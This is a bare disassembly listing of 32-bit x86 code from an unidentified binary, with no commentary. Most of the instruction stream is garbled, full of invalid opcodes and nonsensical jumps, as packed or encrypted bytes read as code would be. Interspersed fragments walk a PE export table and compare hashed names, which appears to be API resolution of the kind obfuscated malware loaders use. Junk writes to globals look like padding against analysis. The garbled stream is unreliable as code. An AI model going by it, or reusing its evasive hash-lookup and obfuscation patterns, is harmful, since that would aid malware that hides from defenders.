  40c01d:	jmp    0xd5045710
  40c022:	mov    esp,0xd8acd05f
  40c027:	xchg   DWORD PTR [ebx+0xfffbfd0],ebp
  40c02d:	or     cl,BYTE PTR [eax]
  40c02f:	out    dx,al
  40c030:	adc    DWORD PTR ss:[eax-0x332955a9],ebp
  40c037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c038:	and    bl,bl
  40c03a:	(bad)  
  40c03b:	cmp    eax,0x1b9fa1a3
  40c040:	dec    edi
  40c041:	and    eax,0x2f45c089
  40c046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c047:	mov    eax,0xbdfd9135
  40c04c:	adc    bl,al
  40c04e:	rcr    DWORD PTR [ebp+0x5acd0dd7],cl
  40c054:	and    BYTE PTR [ecx+0x15],ah
  40c057:	call   0x7f60acdd
  40c05c:	sbb    eax,0x23dd3e21
  40c061:	push   es
  40c062:	iret   
  40c063:	jns    0x40c017
  40c065:	xlat   BYTE PTR ds:[ebx]
  40c066:	jae    0x69231e60
  40c06c:	loopne 0x40c053
  40c06e:	aad    0x46
  40c070:	add    DWORD PTR [esi-0x475bd064],ebp
  40c076:	xchg   ebp,eax
  40c077:	into   
  40c078:	and    DWORD PTR [edi-0x266dfdf6],edi
  40c07e:	adc    al,0x2c
  40c080:	jmp    0x40c0a8
  40c082:	xor    al,0xcf
  40c084:	or     BYTE PTR [eax+0x27ef6de8],ah
  40c08a:	or     al,0x55
  40c08c:	fsub   st(6),st
  40c08e:	dec    ecx
  40c08f:	mov    al,0x6c
  40c091:	fwait
  40c092:	mov    edi,0x4bb93876
  40c097:	add    ecx,DWORD PTR [eax+0x20]
  40c09a:	mov    eax,ds:0x430542
  40c09f:	or     eax,DWORD PTR ds:0x42ee0c
  40c0a5:	mov    ds:0x430542,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43049e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e762
  40c0cb:	mov    ds:0x43049e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4304a6,0x0
  40c0dd:	mov    eax,ds:0x4304a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4304a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4304a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4304b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e776
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e8f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eaf4
  40c11d:	cmp    DWORD PTR ds:0x4304a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	imul   eax,DWORD PTR [edx-0x2cd8084],0x7f3f7e7e
  40c150:	jle    0x40c1d0
  40c152:	cmp    al,BYTE PTR [ecx+0x5881d3d4]
  40c158:	jle    0x40c0ff
  40c15a:	mov    WORD PTR [edx],ds
  40c15c:	adc    esi,esp
  40c15e:	stos   BYTE PTR es:[edi],al
  40c15f:	jmp    0x40c16f
  40c161:	and    DWORD PTR [ecx+0x4f],0x48
  40c165:	xchg   esp,eax
  40c166:	mov    ebp,0x1b538046
  40c16b:	adc    cl,BYTE PTR [ebp-0x44]
  40c16e:	clc    
  40c16f:	mov    edi,0xb8d1d461
  40c174:	ror    BYTE PTR [edi+0x6e],0x9b
  40c178:	xor    edx,ebx
  40c17a:	mov    esi,0x93d737fd
  40c17f:	pop    ds
  40c180:	int3   
  40c181:	call   0x4aef6585
  40c186:	ret    
  40c187:	mov    edx,0xc8cea453
  40c18c:	aas    
  40c18d:	cmp    ecx,ebx
  40c18f:	(bad)  [eax]
  40c191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c192:	hlt    
  40c193:	mov    esp,0x1ac8697c
  40c198:	mov    ds:0xc9917b83,al
  40c19d:	jmp    0xad1b29f3
  40c1a2:	(bad)  
  40c1a4:	jno    0x40c213
  40c1a6:	test   eax,0xed3c7205
  40c1ab:	jb     0x40c229
  40c1ad:	test   al,0x82
  40c1af:	ds (bad) 
  40c1b1:	adc    bl,al
  40c1b3:	and    BYTE PTR [edx+edx*8+0x43],ah
  40c1b7:	sahf   
  40c1b8:	push   ss
  40c1b9:	ins    BYTE PTR es:[edi],dx
  40c1ba:	fdivr  DWORD PTR [ebx]
  40c1bc:	mov    al,ds:0x93d5a8f8
  40c1c1:	cmp    ch,0xf5
  40c1c4:	xor    al,0x45
  40c1c6:	push   esp
  40c1c7:	int    0x22
  40c1c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ca:	bound  eax,QWORD PTR [ebx]
  40c1cc:	fadd   QWORD PTR [esi+0x6a]
  40c1cf:	mov    edi,0x9321c512
  40c1d4:	pop    ebp
  40c1d5:	daa    
  40c1d6:	imul   DWORD PTR [edx-0x25c2be69]
  40c1dc:	jne    0x40c165
  40c1de:	and    esp,DWORD PTR ds:0x2be6256a
  40c1e4:	int    0x5a
  40c1e6:	call   0xc4bd6f9e
  40c1eb:	xlat   BYTE PTR ds:[ebx]
  40c1ec:	mov    ds:0xcd64630,al
  40c1f1:	and    al,0x14
  40c1f3:	push   eax
  40c1f4:	xchg   ebp,eax
  40c1f5:	jecxz  0x40c225
  40c1f7:	adc    BYTE PTR ds:0x3d9996fd,ch
  40c1fd:	call   FWORD PTR [esi+0x36]
  40c200:	jo     0x40c1e2
  40c202:	pop    ebp
  40c203:	sbb    al,0xfd
  40c205:	dec    eax
  40c206:	daa    
  40c207:	or     eax,DWORD PTR cs:[edi-0x55]
  40c20b:	ins    BYTE PTR es:[edi],dx
  40c20c:	outs   dx,BYTE PTR ds:[esi]
  40c20d:	push   eax
  40c20e:	jle    0x40c232
  40c210:	icebp  
  40c211:	jns    0x40c205
  40c213:	out    0xd8,al
  40c215:	(bad)  
  40c216:	gs (bad) 
  40c218:	dec    esp
  40c219:	aad    0x47
  40c21b:	jbe    0x40c231
  40c21d:	push   edi
  40c21e:	push   eax
  40c21f:	aaa    
  40c220:	sti    
  40c221:	mov    ecx,0x1fe08f52
  40c226:	sub    ebp,DWORD PTR [ecx-0x17]
  40c229:	sub    BYTE PTR [ebx+edi*8+0x46],al
  40c22d:	dec    esi
  40c22e:	pop    ecx
  40c22f:	inc    ebp
  40c230:	xlat   BYTE PTR ds:[ebx]
  40c231:	sub    ah,ah
  40c233:	mov    DWORD PTR [eax-0x8],ebx
  40c236:	ds inc esi
  40c238:	pop    ebx
  40c239:	dec    eax
  40c23a:	rcr    DWORD PTR [ebp+0x2b39649e],cl
  40c240:	ss ret 
  40c242:	pop    eax
  40c243:	cmp    DWORD PTR [eax+0xe],esp
  40c246:	push   esp
  40c247:	cmp    dh,BYTE PTR [edi+0x65]
  40c24a:	mov    esi,fs
  40c24c:	pop    es
  40c24d:	push   ds
  40c24e:	pop    edx
  40c24f:	sub    al,0x8c
  40c251:	and    esp,edi
  40c253:	into   
  40c254:	rol    BYTE PTR [edi+edi*1+0x26],1
  40c258:	retf   
  40c259:	adc    DWORD PTR [esi+eax*2],eax
  40c25c:	cmp    dl,BYTE PTR [edx-0x6d]
  40c25f:	mov    edx,0x60533555
  40c264:	dec    edx
  40c265:	outs   dx,BYTE PTR ds:[esi]
  40c266:	and    al,0x69
  40c268:	adc    bh,bh
  40c26a:	enter  0xf4c8,0x3b
  40c26e:	and    BYTE PTR [ebx+0x27],dl
  40c271:	dec    ebp
  40c272:	shr    DWORD PTR [ecx],0x75
  40c275:	les    ebp,FWORD PTR [edx+0x4a]
  40c278:	mov    ds:0x2512fc83,al
  40c27d:	ret    
  40c27e:	sti    
  40c27f:	sbb    dh,bl
  40c281:	in     al,dx
  40c282:	jg     0x40c236
  40c284:	or     BYTE PTR [eax+0x5e25f198],bh
  40c28a:	add    al,0xfb
  40c28c:	pushf  
  40c28d:	pop    edx
  40c28e:	pop    esi
  40c28f:	leave  
  40c290:	jnp    0x40c23b
  40c292:	cdq    
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x27e92bcc,0xf3fec6c9
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c29d
  40c2bd:	jmp    DWORD PTR [edx]
  40c2bf:	pop    edx
  40c2c0:	mov    cl,0x5c
  40c2c2:	(bad)  
  40c2c3:	aaa    
  40c2c4:	add    esp,DWORD PTR [ebx+edi*2+0x65b8ea1a]
  40c2cb:	mov    DWORD PTR [ebx],eax
  40c2cd:	inc    ecx
  40c2ce:	out    dx,eax
  40c2cf:	mov    ebp,0xb311d1b
  40c2d4:	xlat   BYTE PTR ds:[ebx]
  40c2d5:	pop    ds
  40c2d6:	dec    ebp
  40c2d7:	sub    BYTE PTR [edx+0x47079694],ch
  40c2dd:	ds pop edi
  40c2df:	mov    edi,0xc83db258
  40c2e4:	mov    ds:0x9d540603,eax
  40c2e9:	sbb    dh,BYTE PTR [esi]
  40c2eb:	loop   0x40c288
  40c2ed:	in     al,0x14
  40c2ef:	(bad)  
  40c2f1:	mov    edx,0xe51f926e
  40c2f6:	xchg   DWORD PTR [ebx-0x22e7640c],ebp
  40c2fc:	je     0x40c314
  40c2fe:	mov    esi,DWORD PTR [esp+edi*1+0x3b]
  40c302:	ret    
  40c303:	xchg   BYTE PTR [edx+0x2],cl
  40c306:	cmp    eax,0x3e6ff1f4
  40c30b:	fisub  WORD PTR [edx]
  40c30d:	mov    al,ds:0x186c772a
  40c312:	mov    ds:0xa65097bf,eax
  40c317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c318:	jo     0x40c2da
  40c31a:	mov    ecx,0xff35e8e1
  40c31f:	(bad)  
  40c320:	xchg   ecx,eax
  40c321:	ret    0xf6b9
  40c324:	xchg   BYTE PTR [esi-0x1a],ch
  40c327:	pop    eax
  40c328:	inc    ecx
  40c329:	cwde   
  40c32a:	xor    eax,0x12d328b1
  40c32f:	cld    
  40c330:	pusha  
  40c331:	out    0x3d,al
  40c333:	mov    ch,0x98
  40c335:	adc    BYTE PTR [esi-0x3046aade],cl
  40c33b:	inc    edx
  40c33c:	xor    BYTE PTR [edx-0x1d],al
  40c33f:	jo     0x40c35c
  40c341:	push   ebp
  40c342:	ins    BYTE PTR es:[edi],dx
  40c343:	cs push edi
  40c345:	icebp  
  40c346:	fst    QWORD PTR [esi]
  40c348:	addr16 pop ecx
  40c34a:	rcr    DWORD PTR [esi],0x38
  40c34d:	mov    al,0x6f
  40c34f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c350:	xchg   ecx,eax
  40c351:	fnstsw WORD PTR [ebx]
  40c353:	lock lds esp,FWORD PTR [edi]
  40c356:	mov    bh,0x33
  40c358:	sbb    al,0xd1
  40c35a:	div    DWORD PTR [eax+0xe9b74df]
  40c360:	(bad)  
  40c361:	bound  ebx,QWORD PTR [edi+0x19c14f79]
  40c367:	(bad)  
  40c368:	pop    ebp
  40c369:	pop    ss
  40c36a:	ror    dl,0xdc
  40c36d:	ret    0x6b7f
  40c370:	push   es
  40c371:	(bad)  
  40c372:	push   ebp
  40c373:	cmp    BYTE PTR [edi],0x9b
  40c376:	xlat   BYTE PTR ds:[ebx]
  40c377:	jle    0x40c34b
  40c379:	sbb    eax,0xddd51093
  40c37e:	push   cs
  40c37f:	dec    eax
  40c380:	jne    0x40c3d8
  40c382:	gs out 0xae,al
  40c385:	mov    ch,0x58
  40c387:	xchg   ebp,eax
  40c388:	mov    ebp,0xe382b5d3
  40c38d:	xchg   esp,eax
  40c38e:	sbb    eax,0x85e91673
  40c393:	mov    ds:0x4ded82fc,al
  40c398:	stos   DWORD PTR es:[edi],eax
  40c399:	stos   DWORD PTR es:[edi],eax
  40c39a:	pop    edx
  40c39b:	jb     0x40c391
  40c39d:	jmp    0xd9d5e86a
  40c3a2:	jmp    FWORD PTR [ebx-0x55]
  40c3a5:	and    cl,0x9c
  40c3a8:	ds xor eax,0x5f4053da
  40c3ae:	xor    eax,0x157c3219
  40c3b3:	mov    al,ds:0xa5d07fc6
  40c3b8:	sar    DWORD PTR [ecx],1
  40c3ba:	stos   BYTE PTR es:[edi],al
  40c3bb:	mov    ds:0x9cc84dad,eax
  40c3c0:	sub    al,0x1d
  40c3c2:	ss dec ecx
  40c3c4:	fisub  WORD PTR [esi-0x4d]
  40c3c7:	dec    eax
  40c3c8:	or     eax,0x9519eb0d
  40c3cd:	mov    ds:0xeeaf141,eax
  40c3d2:	jo     0x40c3ab
  40c3d4:	add    eax,esp
  40c3d6:	loopne 0x40c3b0
  40c3d8:	(bad)  
  40c3da:	adc    dh,dl
  40c3dc:	jg     0x40c3ad
  40c3de:	inc    edi
  40c3df:	adc    al,0x25
  40c3e1:	push   esp
  40c3e2:	sub    al,0x52
  40c3e4:	lock sub esp,esi
  40c3e7:	mov    ds:0x7c1cd9f9,al
  40c3ec:	push   ds
  40c3ed:	sbb    eax,0x22dccbcc
  40c3f2:	jge    0x40c431
  40c3f4:	mov    esp,0x72cccc19
  40c3f9:	in     al,dx
  40c3fa:	(bad)  
  40c3fb:	fisub  WORD PTR [ebp-0x1607ba73]
  40c401:	pop    ecx
  40c402:	add    DWORD PTR [eax],eax
  40c404:	add    BYTE PTR [ecx],ah
  40c406:	stos   BYTE PTR es:[edi],al
  40c407:	ja     0x40c433
  40c409:	popf   
  40c40a:	stos   DWORD PTR es:[edi],eax
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	mulps  xmm6,XMMWORD PTR [ebx+edx*8+0x7e7effb4]
  40c419:	aas    
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c420
  40c41e:	aad    0x19
  40c420:	mov    eax,ecx
  40c422:	push   edx
  40c423:	adc    bl,BYTE PTR [eax+0x4c3ebb70]
  40c429:	cmp    DWORD PTR [ecx-0x72],edx
  40c42c:	daa    
  40c42d:	add    ah,BYTE PTR [edi+0x55]
  40c430:	sub    DWORD PTR ds:0x56d26234,edx
  40c436:	pop    es
  40c437:	push   eax
  40c438:	out    0x3,al
  40c43a:	sub    bh,BYTE PTR [ebx+0x23]
  40c43d:	mov    esi,0x265ca22
  40c442:	stos   BYTE PTR es:[edi],al
  40c443:	adc    eax,0xba1d092a
  40c448:	xchg   esp,eax
  40c449:	dec    ecx
  40c44a:	in     eax,0x4a
  40c44c:	push   0x702c6375
  40c451:	pcmpgtd mm7,QWORD PTR [esi+0x7a3bd27c]
  40c458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c459:	xor    BYTE PTR [eax],0x3c
  40c45c:	sub    edi,DWORD PTR [ebx-0x5a7204a4]
  40c462:	jnp    0x40c4a7
  40c464:	cmc    
  40c465:	clc    
  40c466:	inc    ebx
  40c467:	xchg   edi,eax
  40c468:	add    al,0x37
  40c46b:	cwde   
  40c46c:	and    dh,BYTE PTR [edi]
  40c46e:	inc    esp
  40c46f:	loop   0x40c477
  40c471:	adc    esp,0xde099aad
  40c477:	cmp    ecx,DWORD PTR [ebp-0x13c5e560]
  40c47d:	and    BYTE PTR [edx],dl
  40c47f:	mov    esp,0x697b465f
  40c484:	or     DWORD PTR [ebx-0x56],ebx
  40c487:	mov    dl,0xd1
  40c489:	xor    DWORD PTR [edx+0x4f],edi
  40c48c:	sahf   
  40c48d:	mov    esi,0x9b3deb54
  40c492:	xchg   DWORD PTR [edx+0x4c91ad5f],ecx
  40c498:	mov    bh,0xcc
  40c49a:	mov    esi,0x85396e98
  40c49f:	inc    ecx
  40c4a0:	inc    esp
  40c4a1:	push   cs
  40c4a2:	shl    DWORD PTR [esi],1
  40c4a4:	cld    
  40c4a5:	shl    BYTE PTR [edi-0xbe9ed06],0xa
  40c4ac:	jl     0x40c4e3
  40c4ae:	push   ebx
  40c4af:	inc    edx
  40c4b0:	xor    al,0x17
  40c4b2:	inc    esi
  40c4b3:	cs cs (bad) 
  40c4b6:	hlt    
  40c4b7:	push   esi
  40c4b8:	sbb    DWORD PTR [esi-0x4d52c872],0x71
  40c4bf:	xlat   BYTE PTR ds:[ebx]
  40c4c0:	add    al,0x6a
  40c4c2:	sub    dh,dl
  40c4c4:	in     eax,0x1e
  40c4c6:	es popf 
  40c4c8:	xchg   esp,eax
  40c4c9:	jae    0x40c47d
  40c4cb:	sub    al,0x42
  40c4cd:	xchg   edi,eax
  40c4ce:	adc    DWORD PTR [eax+0x1ceef9e4],edx
  40c4d4:	fisubr WORD PTR [ecx]
  40c4d6:	jae    0x40c4fc
  40c4d8:	sub    DWORD PTR [eax],esp
  40c4da:	hlt    
  40c4db:	enter  0x7e7,0xf2
  40c4df:	xor    al,0xf6
  40c4e1:	mov    esp,0x72606f35
  40c4e6:	cwde   
  40c4e7:	lods   eax,DWORD PTR ds:[esi]
  40c4e8:	or     ah,bl
  40c4ea:	mov    bh,BYTE PTR [ebp+0x533bf5e5]
  40c4f0:	xor    BYTE PTR [ebp+edx*2-0x5a0faf8c],bl
  40c4f7:	cdq    
  40c4f8:	sub    esp,esp
  40c4fa:	aad    0xa4
  40c4fc:	stos   BYTE PTR es:[edi],al
  40c4fd:	pop    ecx
  40c4fe:	fld    DWORD PTR [eax]
  40c500:	dec    edi
  40c501:	xchg   esp,eax
  40c502:	xor    bl,cl
  40c504:	fs div al
  40c507:	sbb    al,0xcc
  40c509:	mov    eax,ds:0x5101d00e
  40c50e:	ins    BYTE PTR es:[edi],dx
  40c50f:	xor    DWORD PTR [edx+0x1b1a753d],ecx
  40c515:	mov    esp,0x35b04dcc
  40c51a:	call   DWORD PTR [edi]
  40c51c:	fstp   QWORD PTR [ebx+0x200475a]
  40c522:	stos   BYTE PTR es:[edi],al
  40c523:	jmp    DWORD PTR [edx-0x690c6e8d]
  40c529:	mov    DWORD PTR [esi],edx
  40c52b:	xchg   BYTE PTR [ebx-0x62],bl
  40c52e:	and    cl,BYTE PTR [eax-0x5d01a8e3]
  40c534:	out    0x28,al
  40c536:	mov    ds:0xe492d89d,al
  40c53b:	cmp    ch,BYTE PTR [edx+eax*1+0x11]
  40c53f:	jle    0x40c50c
  40c541:	out    dx,al
  40c542:	scas   eax,DWORD PTR es:[edi]
  40c543:	out    dx,eax
  40c544:	scas   al,BYTE PTR es:[edi]
  40c545:	push   0xfffffff8
  40c547:	stos   DWORD PTR es:[edi],eax
  40c548:	les    edi,FWORD PTR [edx+0x5e]
  40c54b:	mov    esp,cs
  40c54d:	add    ch,BYTE PTR [edx+eax*8-0x5f]
  40c551:	jae    0x40c547
  40c553:	arpl   WORD PTR [edx],bx
  40c555:	xchg   BYTE PTR [ecx+0x2f],al
  40c558:	push   0xd49cc7b3
  40c55d:	sub    DWORD PTR [ecx-0xaf2fb3],ecx
  40c563:	jne    0x40c535
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0xe1027b51
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c524
  40c58e:	jecxz  0x40c5c3
  40c590:	xchg   ecx,eax
  40c591:	jne    0x40c60e
  40c593:	mov    esi,DWORD PTR [esi+0x6fcf9a58]
  40c599:	mov    ecx,0x7564346c
  40c59e:	xchg   edx,eax
  40c59f:	sub    eax,0x7ee2d0a2
  40c5a4:	repnz sbb ebp,DWORD PTR [eax+0x44e46df0]
  40c5ab:	cld    
  40c5ac:	xchg   ebx,eax
  40c5ad:	lods   al,BYTE PTR ds:[esi]
  40c5ae:	aaa    
  40c5af:	add    BYTE PTR [ebp+0x1d],dh
  40c5b2:	adc    cl,BYTE PTR [eax]
  40c5b4:	loope  0x40c5f2
  40c5b6:	xor    BYTE PTR ds:0x6303604,ah
  40c5bc:	cvtdq2ps xmm4,XMMWORD PTR [eax+0x11af280b]
  40c5c3:	or     DWORD PTR [ecx-0x39],0x3e233a5
  40c5ca:	xchg   BYTE PTR [ebp-0x68],bh
  40c5cd:	adc    eax,0xfa4c07db
  40c5d2:	jo     0x40c5bc
  40c5d4:	xor    ebx,ebp
  40c5d6:	gs out 0x41,al
  40c5d9:	sbb    dl,BYTE PTR [edi-0x17]
  40c5dc:	fidiv  DWORD PTR [ebp-0x57]
  40c5df:	cmp    DWORD PTR [edx+0x38],eax
  40c5e2:	inc    esp
  40c5e3:	fisubr WORD PTR [ebx]
  40c5e5:	ret    
  40c5e6:	xchg   esp,eax
  40c5e7:	dec    ecx
  40c5e8:	fsub   DWORD PTR [edx+0x70]
  40c5eb:	pushf  
  40c5ec:	jnp    0x40c5e6
  40c5ee:	mov    edi,0xa09dddcd
  40c5f3:	jmp    0xb7ace72
  40c5f8:	pop    eax
  40c5f9:	adc    al,0x64
  40c5fb:	(bad)  
  40c5fc:	cli    
  40c5fd:	(bad)  
  40c5fe:	jns    0x40c60b
  40c600:	mov    ?,WORD PTR [ebx+0x21d7cd95]
  40c606:	dec    ecx
  40c607:	cdq    
  40c608:	sbb    DWORD PTR [eax-0x369ca5f3],esp
  40c60e:	out    dx,al
  40c60f:	sbb    DWORD PTR [eax],ebp
  40c611:	fsubr  QWORD PTR [eax]
  40c613:	arpl   bx,ax
  40c615:	mov    WORD PTR [ecx+0x120ad4fb],es
  40c61b:	in     al,dx
  40c61c:	adc    edx,DWORD PTR [edi]
  40c61e:	sbb    dl,BYTE PTR [esi-0x55a609d]
  40c624:	cmp    edi,DWORD PTR [edx-0x4a]
  40c627:	jne    0x40c670
  40c629:	scas   eax,DWORD PTR es:[edi]
  40c62a:	ror    bl,cl
  40c62c:	in     al,0xca
  40c62e:	lods   eax,DWORD PTR ds:[esi]
  40c62f:	fnstcw WORD PTR [edx]
  40c631:	push   ds
  40c632:	mov    al,ds:0x2692fc12
  40c637:	jns    0x40c655
  40c639:	pushf  
  40c63a:	stos   DWORD PTR es:[edi],eax
  40c63b:	fidiv  DWORD PTR ds:0x5008bcf4
  40c641:	popa   
  40c642:	and    DWORD PTR [ecx-0x45c943f4],ebp
  40c648:	push   0x92782682
  40c64d:	cmp    eax,0xb3c680a4
  40c652:	sbb    ecx,DWORD PTR [ebx+0x2e23b64f]
  40c658:	lock cmp BYTE PTR [esi+ebp*2-0x357c905b],0xae
  40c661:	add    esp,DWORD PTR [edi-0x28000062]
  40c667:	loop   0x40c648
  40c669:	inc    ebx
  40c66a:	fstp   QWORD PTR [edx]
  40c66c:	mov    dh,0xff
  40c66f:	push   ebx
  40c670:	jno    0x40c6b6
  40c672:	lods   eax,DWORD PTR ds:[esi]
  40c673:	jnp    0x40c6d6
  40c675:	bound  esp,QWORD PTR [ebx]
  40c677:	inc    eax
  40c678:	nop
  40c679:	nop
  40c67a:	sti    
  40c67b:	mov    ebx,0xf2b5d033
  40c680:	xchg   DWORD PTR [ecx],ebp
  40c682:	sbb    BYTE PTR [ebx+ecx*4-0x6be724df],bl
  40c689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68a:	(bad)  
  40c68b:	das    
  40c68c:	jbe    0x40c701
  40c68e:	pop    ebp
  40c68f:	push   0x6c
  40c691:	dec    esi
  40c692:	in     al,dx
  40c693:	in     al,dx
  40c694:	repnz retf 
  40c696:	icebp  
  40c697:	cmp    DWORD PTR [eax+eiz*2-0x57],ecx
  40c69b:	gs enter 0x587b,0x17
  40c6a0:	xchg   ebp,eax
  40c6a1:	dec    ecx
  40c6a2:	xor    al,0x82
  40c6a4:	int3   
  40c6a5:	ss mov ecx,0x40f8dba1
  40c6ab:	mov    DWORD PTR [edi],ebp
  40c6ad:	arpl   WORD PTR [ecx-0x203ed89d],bp
  40c6b3:	(bad)  
  40c6b4:	cmp    ecx,DWORD PTR [edx+0x49]
  40c6b7:	repz ds jmp 0x291f9c5a
  40c6be:	xor    BYTE PTR [edx+0xdef7748],cl
  40c6c4:	adc    dl,dh
  40c6c6:	push   ds
  40c6c7:	push   ecx
  40c6c8:	mov    esp,0x6acd0454
  40c6cd:	cld    
  40c6ce:	mov    ecx,DWORD PTR [ebp-0x8]
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	pusha  
  40c741:	push   ds
  40c742:	popa   
  40c743:	cwde   
  40c744:	ss bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c707
  40c74d:	data16 ins BYTE PTR es:[edi],dx
  40c74f:	jae    0x40c780
  40c751:	jae    0x40c6dd
  40c753:	mov    ah,0x71
  40c755:	retf   
  40c756:	enter  0x5f7e,0x97
  40c75a:	jne    0x40c74c
  40c75c:	lods   eax,DWORD PTR ds:[esi]
  40c75d:	loopne 0x40c7bd
  40c75f:	mov    BYTE PTR [ecx+0x4e],bl
  40c762:	push   ds
  40c763:	out    0xac,eax
  40c765:	test   al,0x83
  40c767:	cld    
  40c768:	ror    bl,cl
  40c76a:	mov    edx,0x8d18c689
  40c76f:	xor    ecx,DWORD PTR [ebp+0x25ec5a2f]
  40c775:	pop    ds
  40c776:	adc    al,0x49
  40c778:	test   al,0xb1
  40c77a:	test   BYTE PTR [ebx],0x41
  40c77d:	mov    bl,0x39
  40c77f:	push   DWORD PTR [edx]
  40c781:	and    eax,edi
  40c783:	inc    ebp
  40c784:	xchg   edi,eax
  40c785:	mov    edi,DWORD PTR [edx]
  40c787:	jl     0x40c773
  40c789:	fisubr WORD PTR [ecx-0x40737b0b]
  40c78f:	push   eax
  40c790:	jecxz  0x40c714
  40c792:	in     eax,0x1
  40c794:	(bad)  
  40c795:	adc    eax,0xe65b153f
  40c79a:	jecxz  0x40c77d
  40c79c:	push   ds
  40c79d:	js     0x40c7d6
  40c79f:	pop    eax
  40c7a0:	loop   0x40c774
  40c7a2:	aam    0xf
  40c7a4:	push   0xffffffbd
  40c7a6:	popf   
  40c7a7:	cld    
  40c7a8:	sub    esi,ebp
  40c7aa:	push   edx
  40c7ab:	ss popa 
  40c7ad:	ss pop ebp
  40c7af:	call   0xcf50:0x135b7815
  40c7b6:	scas   al,BYTE PTR es:[edi]
  40c7b7:	outs   dx,DWORD PTR ds:[esi]
  40c7b8:	inc    esp
  40c7b9:	and    al,0x74
  40c7bb:	fisubr WORD PTR [edi-0x3a411607]
  40c7c1:	add    eax,0x5ac8481
  40c7c6:	call   0x8e5c:0x21bc3aa3
  40c7cd:	xor    eax,0x4d60f8f5
  40c7d2:	jge    0x40c766
  40c7d4:	lods   al,BYTE PTR ds:[esi]
  40c7d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7d6:	mov    ecx,0xc336f1c2
  40c7db:	cmp    eax,esp
  40c7dd:	mov    dl,0x9b
  40c7df:	mov    ebp,gs
  40c7e1:	pusha  
  40c7e2:	jne    0x40c76d
  40c7e4:	push   0x3bbf44e7
  40c7e9:	ret    0x224e
  40c7ec:	sahf   
  40c7ed:	mov    eax,0x31c36a1f
